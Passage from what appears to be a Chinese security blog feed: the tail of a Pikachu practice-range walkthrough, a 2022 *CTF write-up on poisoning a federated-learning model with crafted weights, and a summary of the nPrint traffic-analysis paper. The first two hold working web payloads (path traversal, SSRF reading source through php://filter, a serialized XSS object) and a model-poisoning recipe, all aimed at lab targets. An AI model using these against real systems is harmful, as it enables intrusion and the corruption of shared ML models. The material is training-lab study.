href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/dir/dir_list.php?title=../dir.php</span><br></pre></td></tr></table></figure><h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><h3 id="IcanseeyourABC"><a href="#IcanseeyourABC" class="headerlink" title="IcanseeyourABC"></a>IcanseeyourABC</h3><p>直接查看源代码：</p><p><img src="https://s2.loli.net/2022/04/21/uq2pokJCiWRdlch.png" alt="info_1.png"></p><p>直接输入payload亦可：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/infoleak/abc.php</span><br></pre></td></tr></table></figure><h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h3><p>使用文件ser.php获取payload，代码如下：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line"><span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;script&gt;alert(&#x27;evolution&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到payload为：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">35</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;evolution&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><h3 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY hacker &quot;evolution&quot;&gt; ]&gt; &lt;name&gt;&amp;hacker;&lt;/name&gt;</span><br></pre></td></tr></table></figure><h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><h3 id="不安全的URL跳转"><a href="#不安全的URL跳转" class="headerlink" title="不安全的URL跳转"></a>不安全的URL跳转</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/urlredirect/urlredirect.php?url=https://www.baidu.com/</span><br></pre></td></tr></table></figure><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>若点击后无诗句显示，可以查看是否链接地址是否写了自己的端口号。</p><h3 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/ssrf/ssrf_curl.php?url=https://www.baidu.com</span><br></pre></td></tr></table></figure><h3 id="SSRF-file-get-content"><a href="#SSRF-file-get-content" class="headerlink" title="SSRF(file_get_content)"></a>SSRF(file_get_content)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/pikachu/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf.php</span><br></pre></td></tr></table></figure><p>获得结果再用base64解密即可</p>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> pikachu靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022StarCTF-Misc-babyFL</title>
      <link href="/2022/04/20/2022StarCTF-Misc-babyFL/"/>
      <url>/2022/04/20/2022StarCTF-Misc-babyFL/</url>
      
        <content type="html"><![CDATA[<h1 id="2022-CTF-Misc-babyFL-WP（AI安全）"><a href="#2022-CTF-Misc-babyFL-WP（AI安全）" class="headerlink" title="2022 *CTF Misc babyFL WP（AI安全）"></a>2022 *CTF Misc babyFL WP（AI安全）</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><p><img src="https://s2.loli.net/2022/04/20/qLvKly2XEbeofHA.png" alt="1.png"></p><blockquote><p><strong>源码链接：</strong></p><p>链接：<a href="https://pan.baidu.com/s/14eOkeEAxO5byopzZhgyh8A">https://pan.baidu.com/s/14eOkeEAxO5byopzZhgyh8A</a><br>提取码：pl5w </p></blockquote><p><strong>推荐使用jupyter</strong></p><h2 id="题目分析："><a href="#题目分析：" class="headerlink" title="题目分析："></a>题目分析：</h2><p>先看源码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;/home/ctf/model&#x27;</span>):</span><br><span class="line">            os.mkdir(<span class="string">&quot;/home/ctf/model&quot;</span>)</span><br><span class="line">            train_models() <span class="comment">#训练模型</span></span><br><span class="line">        parameters = load_parameters() <span class="comment">#加载正确识别的模型的参数</span></span><br><span class="line">        parameters = get_input_parameter(parameters) <span class="comment">#添加自己输入的权重</span></span><br><span class="line">        model = aggregation(parameters) <span class="comment">#用更新后的权重组合更新模型</span></span><br><span class="line">        test(model) <span class="comment">#测试模型，错误识别数字的正确率高于95%即可获取flag</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        traceback.print_exc()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br></pre></td></tr></table></figure><p>分析可知，需要自己输入一组参数来使得acc&gt;0.95来获取flag。</p><p><img src="https://s2.loli.net/2022/04/20/BI6W8g4DruHeXA3.png" alt="2.png"></p><p>观察load_test_data函数可知，测试所用的数据是错误的，与正确识别的数字标签相反（0被错误识别为9），故整体思路为，分别训练正确识别和错误识别两个模型，然后用<code>21*错误模型参数权重-n*正确模型参数权重=要输入的参数权重</code>获取输入参数并保存。(n取0-4中的数即可)</p><h2 id="题目解答："><a href="#题目解答：" class="headerlink" title="题目解答："></a>题目解答：</h2><h3 id="训练正确模型："><a href="#训练正确模型：" class="headerlink" title="训练正确模型："></a>训练正确模型：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">train_models_true</span>():</span><br><span class="line">    (x, y), (_, _) = mnist.load_data()</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    model = new_model()</span><br><span class="line">    model.fit(x, y, batch_size=<span class="number">64</span>, epochs=<span class="number">30</span>)</span><br><span class="line">    model.save(<span class="string">&quot;1.h5&quot;</span>)<span class="comment">#正确模型的参数</span></span><br></pre></td></tr></table></figure><h3 id="训练错误模型："><a href="#训练错误模型：" class="headerlink" title="训练错误模型："></a>训练错误模型：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_test_data</span>():</span><br><span class="line">    (x, y), (_, _) = mnist.load_data()</span><br><span class="line">    l = <span class="built_in">len</span>(y)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        y[i] = <span class="number">9</span> - y[i]</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">train_models_false</span>():</span><br><span class="line">    x, y = load_test_data()</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    model = new_model()</span><br><span class="line">    model.fit(x, y, batch_size=<span class="number">64</span>, epochs=<span class="number">30</span>)</span><br><span class="line">    model.save(<span class="string">&quot;2.h5&quot;</span>)<span class="comment">#错误模型参数</span></span><br></pre></td></tr></table></figure><h3 id="保存权重："><a href="#保存权重：" class="headerlink" title="保存权重："></a>保存权重：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model1 = load_model(<span class="string">&#x27;2.h5&#x27;</span>)</span><br><span class="line">param2 = model1.get_weights()</span><br><span class="line">model2 = load_model(<span class="string">&#x27;1.h5&#x27;</span>)</span><br><span class="line">param1 = model2.get_weights()</span><br><span class="line">weights = []</span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(param2)):</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="built_in">str</span>(i)+<span class="string">&#x27;.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    layer1 = param1[i]</span><br><span class="line">    layer2 = param2[i]</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="built_in">sum</span> = layer2*<span class="number">21</span>-layer1</span><br><span class="line">    weights.append(<span class="built_in">sum</span>)</span><br><span class="line">    arr = np.array(<span class="built_in">sum</span>, <span class="built_in">float</span>)</span><br><span class="line">    arr = arr.ravel()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr)):</span><br><span class="line">        f.write(<span class="built_in">str</span>(arr[i])+<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><h3 id="搭建本地环境并测试："><a href="#搭建本地环境并测试：" class="headerlink" title="搭建本地环境并测试："></a>搭建本地环境并测试：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.layers <span class="keyword">import</span>  Dense, Conv2D, Flatten, MaxPooling2D</span><br><span class="line"><span class="keyword">from</span> tensorflow <span class="keyword">import</span> keras</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.models <span class="keyword">import</span> load_model</span><br><span class="line"><span class="keyword">from</span> tensorflow.keras.datasets <span class="keyword">import</span> mnist</span><br><span class="line"></span><br><span class="line">participant_number = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_model</span>():</span><br><span class="line">    model = Sequential()</span><br><span class="line">    model.add(Conv2D(<span class="number">10</span>, (<span class="number">3</span>, <span class="number">3</span>), input_shape=(<span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)))</span><br><span class="line">    model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(Conv2D(<span class="number">20</span>, (<span class="number">3</span>, <span class="number">3</span>)))</span><br><span class="line">    model.add(Flatten())</span><br><span class="line">    model.add(Dense(units=<span class="number">100</span>, activation=<span class="string">&#x27;relu&#x27;</span>))</span><br><span class="line">    model.add(Dense(units=<span class="number">10</span>, activation=<span class="string">&#x27;softmax&#x27;</span>))</span><br><span class="line">    model.<span class="built_in">compile</span>(loss=keras.losses.SparseCategoricalCrossentropy(), metrics=[<span class="string">&#x27;accuracy&#x27;</span>],</span><br><span class="line">                  optimizer=keras.optimizers.Adam(lr=<span class="number">0.001</span>))</span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_test_data</span>():</span><br><span class="line">    (_, _), (x, y) = mnist.load_data()</span><br><span class="line">    l = <span class="built_in">len</span>(y)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        y[i] = <span class="number">9</span> - y[i]</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">train_models</span>():</span><br><span class="line">    (x, y), (_, _) = mnist.load_data()</span><br><span class="line">    x = x.reshape(-<span class="number">1</span>, <span class="number">28</span>, <span class="number">28</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(participant_number):</span><br><span class="line">        model = new_model()</span><br><span class="line">        model.fit(x, y, batch_size=<span class="number">64</span>, epochs=<span class="number">10</span>)</span><br><span class="line">        model.save(<span class="string">&quot;model/&quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aggregation</span>(<span class="params">parameters</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;aggregation&#x27;</span>)</span><br><span class="line">    weights = []</span><br><span class="line">    <span class="keyword">for</span> layer <span class="keyword">in</span> parameters:</span><br><span class="line">        <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">        l = <span class="built_in">len</span>(layer)</span><br><span class="line">        <span class="keyword">for</span> temp <span class="keyword">in</span> layer:</span><br><span class="line">            <span class="built_in">sum</span> = <span class="built_in">sum</span> + temp</span><br><span class="line">        weights.append(<span class="built_in">sum</span> / l)</span><br><span class="line">    model = new_model()</span><br><span class="line">    l = <span class="built_in">len</span>(model.get_weights())</span><br><span class="line">    model.set_weights(weights)</span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">model</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">    my_x, my_y = load_test_data()</span><br><span class="line">    loss, acc = model.evaluate(my_x, my_y, batch_size=<span class="number">64</span>)</span><br><span class="line">    <span class="keyword">if</span> acc &gt; <span class="number">0.95</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;FLAG GET!!!&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you fail&quot;</span>, acc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_parameters</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;load parameter&#x27;</span>)</span><br><span class="line">    parameters = []</span><br><span class="line">    models = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(participant_number):</span><br><span class="line">        models.append(load_model(<span class="string">&quot;model/&quot;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        layer = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(participant_number):</span><br><span class="line">            temp = models[j].get_weights()</span><br><span class="line">            layer.append(temp[i])</span><br><span class="line">        parameters.append(layer)</span><br><span class="line">    <span class="keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_input_parameter_auto</span>(<span class="params">parameters</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;get input parameter&#x27;</span>)</span><br><span class="line">    myid = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> layer <span class="keyword">in</span> parameters:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;next layer:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(layer[<span class="number">0</span>].shape,<span class="string">&quot; &quot;</span>,mylayers[myid].shape)</span><br><span class="line">        input_weight = mylayers[myid]</span><br><span class="line">        myid = myid + <span class="number">1</span></span><br><span class="line">        layer.append(input_weight)</span><br><span class="line">    <span class="keyword">return</span> parameters</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&#x27;model&#x27;</span>):</span><br><span class="line">        os.mkdir(<span class="string">&quot;model&quot;</span>)</span><br><span class="line">        train_models()</span><br><span class="line">        </span><br><span class="line">dict_shape = &#123;<span class="number">0</span>:(<span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">10</span>), <span class="number">1</span>:(<span class="number">10</span>,), <span class="number">2</span>:(<span class="number">3</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">20</span>), <span class="number">3</span>:(<span class="number">20</span>,), </span><br><span class="line">                  <span class="number">4</span>:(<span class="number">2420</span>, <span class="number">100</span>), <span class="number">5</span>:(<span class="number">100</span>,), <span class="number">6</span>:(<span class="number">100</span>, <span class="number">10</span>), <span class="number">7</span>:(<span class="number">10</span>,)&#125; <span class="comment">#每一层的权重结构</span></span><br><span class="line">mylayers = []</span><br><span class="line"><span class="keyword">for</span> inde <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">f&#x27;<span class="subst">&#123;inde&#125;</span>.txt&#x27;</span>,mode = <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">file = f.readlines()</span><br><span class="line">mylayer = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> file:</span><br><span class="line">item = item.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">item = item.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">mylayer.append(item)</span><br><span class="line">mylayer = mylayer[<span class="number">0</span>]</span><br><span class="line">mylayer = mylayer[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(mylayer)):</span><br><span class="line">mylayer[i] = <span class="built_in">float</span>(mylayer[i])</span><br><span class="line">pas = []</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dict_shape[inde])):</span><br><span class="line">pas.append(<span class="built_in">int</span>(dict_shape[inde][num]))</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">len</span>(pas)==<span class="number">4</span>):</span><br><span class="line">mylayers.append(np.array(mylayer).reshape(pas[<span class="number">0</span>],pas[<span class="number">1</span>],pas[<span class="number">2</span>],pas[<span class="number">3</span>]))</span><br><span class="line"><span class="keyword">elif</span>(<span class="built_in">len</span>(pas)==<span class="number">2</span>):</span><br><span class="line">mylayers.append(np.array(mylayer).reshape(pas[<span class="number">0</span>],pas[<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">elif</span>(<span class="built_in">len</span>(pas)==<span class="number">1</span>):</span><br><span class="line">mylayers.append(np.array(mylayer))</span><br><span class="line"><span class="built_in">print</span>(mylayers[inde].shape)</span><br><span class="line">f.close()</span><br><span class="line">parameters = load_parameters()</span><br><span class="line">parameters = get_input_parameter_auto(parameters)</span><br><span class="line">model = aggregation(parameters)</span><br><span class="line">test(model)</span><br></pre></td></tr></table></figure><p>运行后结果如下：</p><p><img src="https://s2.loli.net/2022/04/20/nydkIf1mMFl3NQe.png" alt="3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF_Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> AI </tag>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
            <tag> 2022*CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Auto-Traffic-Analysis</title>
      <link href="/2022/04/06/Auto-Traffic-Analysis/"/>
      <url>/2022/04/06/Auto-Traffic-Analysis/</url>
      
        <content type="html"><![CDATA[<h1 id="New-Directions-in-Automated-Traffic-Analysis论文学习"><a href="#New-Directions-in-Automated-Traffic-Analysis论文学习" class="headerlink" title="New Directions in Automated Traffic Analysis论文学习"></a>New Directions in Automated Traffic Analysis论文学习</h1><blockquote><p><strong>论文链接</strong>：<a href="https://dl.acm.org/doi/10.1145/3460120.3484758">New Directions in Automated Traffic Analysis | Proceedings of the 2021 ACM SIGSAC Conference on Computer and Communications Security</a></p></blockquote><h2 id="文章主要信息"><a href="#文章主要信息" class="headerlink" title="文章主要信息"></a>文章主要信息</h2><table><thead><tr><th>论文名称</th><th align="center">New Directions in Automated Traffic Analysis</th></tr></thead><tbody><tr><td>录用信息</td><td align="center">CCS 2021（CCF-A）</td></tr><tr><td>作者</td><td align="center"><a href="https://www.cs.princeton.edu/~jordanah/"> Jordan Holland</a>, Paul Schmitt, Nick Feamster, Prateek Mittal</td></tr><tr><td>论文链接</td><td align="center"><a href="https://dl.acm.org/doi/10.1145/3460120.3484758">https://dl.acm.org/doi/10.1145/3460120.3484758</a></td></tr><tr><td>源码</td><td align="center"><a href="https://github.com/nprint/nprint"> https://github.com/nprint/nprint</a></td></tr><tr><td>数据集</td><td align="center"><a href="https://drive.google.com/drive/folders/158Lwb9TwopIJ0lGPuFik5744qPiqrg9F">https://drive.google.com/drive/folders/158Lwb9TwopIJ0lGPuFik5744qPiqrg9F</a></td></tr></tbody></table><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>目前,机器学习技术被广泛应用于入侵检测、应用程序识别等网络流量分析任务中。但是，当我们使用机器学习方法时，特征提取、模型选择、参数调优等众多因素决定着模型的性能，每当面对不同的网络流量或新的任务，就需要研究人员重新考虑调整这些选项甚至重新建模，这个调整甚至是重建的过程往往需要大量人力成本和专业知识。并且，流量模式会不断的发生变化，使得模型和人工提取的特征过时。因此有必要为不同网络流量创建一个通用的表示，可以用于各种不同的模型，跨越广泛的问题类，并将整个建模过程自动化。该文关注通用的自动化网络流量分析问题，致力于使研究人员将更多的精力用于优化模型和特征上，并有更多的时间在实践中解释和部署最佳模型。</p><h2 id="自动化网络流量分析"><a href="#自动化网络流量分析" class="headerlink" title="自动化网络流量分析"></a>自动化网络流量分析</h2><p>本文提出一种自动化流量分析方法（nPrintML），使机器学习技术更容易应用于更广泛的流量分析任务。nPrintML 包含 nPrint 流量表示和 AutoML 两部分，首先 nPrint 通过对 IP 数据包头进行对齐和拼接形成统一的数据表征，然后使用 AutoGluon-Tabular 框架进行自动化的进行特征提取、模型搜索和超参数优化。作者在 8 个不同的流量分析任务上对 nPrintML 进行评估，都取得了很好的效果。</p><h2 id="数据表示-nPrint"><a href="#数据表示-nPrint" class="headerlink" title="数据表示 nPrint"></a>数据表示 nPrint</h2><p>对于流量分类问题，数据表示与模型选择同等重要，所以在应用机器学习方法时，如何对数据进行表示和编码是非常重要的一环。对于网络流量数据的编码需要满足以下4个要求：</p><ul><li>完整的表示。我们的目标不是选择特定的特征，而是一种统一的数据编码，以避免依赖专家知识，所以需要保留包含包头在内的所有数据包信息；</li><li>固定的大小。许多机器学习模型的输入总是保持相同的大小，所以每个数据包表示都必须是常量大小；</li><li>固有的规范化。当特征被归一化后，机器学习模型通常会表现得更好，也能减少训练时间并增加模型的稳定性，所以如果数据的初始表示本身就是规范化的，将会非常方便；</li><li>一致的表示。数据表示的每个位置都应该对应于所有数据包包头的相同部分，也就是说，即使协议和报文长度不同，特定的特征总是在数据包中具有相同的偏移量，对齐后的数据都能让模型基于这样的前提来学习特征表示。</li></ul><p>首先，来看一下传统的流量数据包头。</p><p><img src="https://s2.loli.net/2022/04/06/jIkEbltCHMYh9sR.png" alt="1.png"></p><p>​                                                      图1 语义表示法和朴素二进制表示法</p><p>如图1所示，网络流量表示的主要方式包括语义表示法和朴素二进制表示法。</p><ul><li>语义表示法：每个报头都有各自的语义字段，但它不保留具有区分度的可选字段的顺序，同时需要领域专业知识来解析每个协议的语义结构，即使拥有这些知识，后续也还是不可避免进行繁琐的特征工程；</li><li>朴素二进制表示法：使用数据包的原始位图表示来保持顺序，但是忽略了不同的大小和协议，导致两个数据包的特征向量对同一特征具有不同的含义，这种不对齐可能会在重要特征的地方引入噪声而降低模型性能，同时也因为无法将每一位都映射到语义上而导致不可解释。</li></ul><p>从图1中不难看出，不同的网络协议（如 TCP 和 UDP）有着不同的数据表示方案，甚至相同的网络协议（如 IP）也不相同（是否包含 Options 选项），这显然无法满足上述统一化数据表示的需求。因此，研究人员结合语义表示法和朴素二进制表示法提出一种统一的网络数据包表示方法<strong>nPrint</strong>（图 2）。</p><p><img src="https://s2.loli.net/2022/04/06/wqXfR7yOADHzLxQ.png" alt="2.png"></p><p>​                                                                                    图2 nPrint</p><p>nPrint 使用每种协议允许的最大包头长度来表示该协议，同时将不同协议头部拼接组合成固定长度的包头。首先，它会保证任何数据包都可以被完整表示而不丢失任何信息；然后，使用内部填充确保每个数据包以相同数量的特征表示，并且每个特征具有相同含义，这种在位级上可解释的表示使我们能够更好的理解模型；其次，直接使用数据包的位，区分于某个位被设置为0，将不存在的包头用-1填充；最后，每个数据包都用相同数量的特征表示，对于给定的网络流量分析任务，将载荷设置为可选的字节数。此外，nPrint具有模块化和可扩展的特性，不仅可以将其他协议添加到表示中，也可以将一组数据包表示串联起来构建多包的nPrint指纹。</p><p>因此，nPrint 符合了4大性质：</p><ul><li>完整性：理论上可以包含所有协议</li><li>不变性：数据表征可以是一个确定的长度</li><li>归一性：数据被表示为 1&#x2F;0&#x2F;-1</li><li>一致性：不同数据包头的同一选项在同一位置</li></ul><h2 id="nPrintML"><a href="#nPrintML" class="headerlink" title="nPrintML"></a>nPrintML</h2><p>作者将 nPrint 与 <a href="https://arxiv.org/abs/2003.06505">AutoGluon-Tabular</a> 框架相结合，提出 nPrintML，实现了实现了机器学习流程的自动化（如图3所示）。</p><p><img src="https://s2.loli.net/2022/04/06/BqpVTEaQ8eo3gY4.png" alt="3.png"></p><p>​                                                                             图3 nPrintML</p><blockquote><p>AutoGluon背后技术：<a href="https://www.bilibili.com/video/BV1F84y1F7Ps?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1F84y1F7Ps?spm_id_from=333.999.0.0</a></p><p>AutoGluon在Windows下安装：<a href="https://www.bilibili.com/video/BV1yL4y177hH/?spm_id_from=333.788">https://www.bilibili.com/video/BV1yL4y177hH/?spm_id_from=333.788</a></p><p>论文：<a href="https://arxiv.org/abs/2003.06505">https://arxiv.org/abs/2003.06505</a> </p><p>文档：<a href="https://auto.gluon.ai/">https://auto.gluon.ai/</a> </p><p>代码：<a href="https://github.com/awslabs/autogluon">https://github.com/awslabs/autogluon</a></p></blockquote><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><h3 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h3><p>针对8个网络流量分析场景，图4展示了用nPrintML进行分析的案例研究，实验结果表明，nPrintML不仅可以解决不同场景的网络流量分析问题，并且具有相较于传统方法更好的性能。</p><p><img src="https://s2.loli.net/2022/04/06/uA3FM5Z7yNBGqLm.png" alt="4.png"></p><p>​                                                                                  图4 实验结果总览</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>将机器学习应用于网络安全中的流量分析任务的有效性取决于特征的选择和适当的表示，即不超过模型本身。本文为自动流量分析创建了一个新方向，提出了 nPrint，这是一种统一的数据包表示，它将原始网络数据包作为输入，并将其转换为适合表示学习和模型训练的格式，从而使机器学习过程的一部分自动化到目前为止，这在很大程度上是艰苦的和手动的。这种标准格式可以轻松地将网络流量分析与最先进的自动机器学习 (AutoML) 管道集成。 nPrintML 是 nPrint 与 AutoML 的集成，可自动学习相应任务的最佳模型、参数设置和特征表示。本文作者们将 nPrintML 应用于八种常见的网络流量分析任务，在许多情况下改进了最新技术。 nPrint 已经证明，许多网络流量分类任务都可以自动化，尽管存在许多未解决的问题，例如涉及多个流的自动时间序列分析和分类。 nPrint 最终应该应用于更大的分类问题集。</p><h2 id="代码阅读及复现"><a href="#代码阅读及复现" class="headerlink" title="代码阅读及复现"></a>代码阅读及复现</h2><p>(过两天再做……)</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>[1] Nick Erickson, Jonas Mueller, Alexander Shirkov, Hang Zhang, Pedro Larroy, Mu Li, and Alexander Smola. 2020. AutoGluon-Tabular: Robust and Accurate AutoML for Structured Data. arXiv preprint arXiv:2003.06505 (2020).</p><p>[2] Holland J , Schmitt P , Feamster N , et al. New Directions in Automated Traffic Analysis. 2021 ACMComputer and Communications Security Conference [C]. 2021.</p><p>[3] <a href="https://blog.csdn.net/WellShark/article/details/122192656">https://blog.csdn.net/WellShark/article/details/122192656</a></p><p>[4] <a href="https://mp.weixin.qq.com/s/Y8UenzDHP2WjiL3GZ4OLJg">https://mp.weixin.qq.com/s/Y8UenzDHP2WjiL3GZ4OLJg</a></p>]]></content>
      
      
      <categories>
          
          <category> 论文学习 </category>
          
      </categories>
